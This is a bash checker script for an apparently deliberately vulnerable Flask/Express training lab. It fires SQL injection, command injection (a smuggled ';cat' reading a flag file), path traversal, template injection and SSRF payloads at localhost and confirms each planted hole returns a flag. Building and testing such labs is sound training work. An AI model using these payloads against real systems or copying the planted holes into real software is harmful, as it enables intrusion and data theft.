#!/usr/bin/env bash
# Fires every payload from GUIDE.md and prints PASS/FAIL per flow.
# Usage: ./check.sh            (Flask :5001, Express :3000)
#        FLASK=http://localhost:5000 ./check.sh
FLASK="${FLASK:-http://localhost:5001}"
EXPRESS="${EXPRESS:-http://localhost:3000}"
fail=0

check() { # name url expect
  local out; out=$(curl -s --max-time 8 "$2")
  if grep -q -- "$3" <<<"$out"; then printf "  PASS  %s\n" "$1"; else printf "  FAIL  %s\n" "$1"; fail=1; fi
}
check_not() { # name url must_not_contain
  local out; out=$(curl -s --max-time 8 "$2")
  if grep -q -- "$3" <<<"$out"; then printf "  FAIL  %s (payload got through)\n" "$1"; fail=1; else printf "  PASS  %s (blocked)\n" "$1"; fi
}

for app in FLASK EXPRESS; do
  B="${!app}"
  echo "== $app  $B"
  curl -s --max-time 5 -o /dev/null "$B/" || { echo "  not reachable"; fail=1; continue; }
  check "1 sqli      /user"  "$B/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets" "FLAG{sqli"
  check "2 cmdi      /ping"  "$B/ping?host=127.0.0.1%3Bcat%20/app/secret/flag.txt" "FLAG{you_reached"
  check "3 traversal /docs"  "$B/docs?name=..%2F..%2Fsecret%2Fflag.txt" "FLAG{you_reached"
  if [ "$app" = FLASK ]; then
    check "4 ssti      /hello" "$B/hello?name=%7B%7B7*7%7D%7D" "Hello 49"
    check "5 ssrf      /fetch" "$B/fetch?url=http://127.0.0.1:3000/user?id=2" "bob@example.com"
  else
    check "4 ssti      /hello" "$B/hello?name=%3C%25=7*7%25%3E" "Hello 49"
    check "5 ssrf      /fetch" "$B/fetch?url=http://127.0.0.1:5000/user?id=2" "bob@example.com"
  fi
  check_not "decoy      /order" "$B/order?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets" "FLAG{"
done

echo
[ $fail -eq 0 ] && echo "ALL PASS: every planted flow is live, decoy holds." || { echo "SOMETHING FAILED (see above)"; exit 1; }
